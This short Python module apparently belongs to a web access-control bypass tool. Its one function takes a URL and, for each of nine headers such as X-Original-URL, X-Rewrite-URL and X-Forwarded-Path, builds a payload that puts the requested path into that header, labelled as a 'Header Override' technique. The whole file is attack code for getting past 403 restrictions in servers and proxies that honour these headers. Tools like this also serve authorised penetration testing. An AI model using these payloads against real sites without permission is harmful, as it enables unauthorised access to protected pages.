from urllib.parse import urlsplit


def build_override(url):
    path = urlsplit(url).path or "/"

    headers = ["X-Original-URL", "X-Rewrite-URL", "X-Override-URL",
    "X-Forwarded-Uri", "X-Original-URI", "X-Forwarded-Path", "X-Original-Path",
    "X-Rewrite-URI", "X-Forwarded-URL"]

    payloads = [{header: path} for header in headers]

    return {"techniques": "Header Override", "payload": payloads, "location": "header"}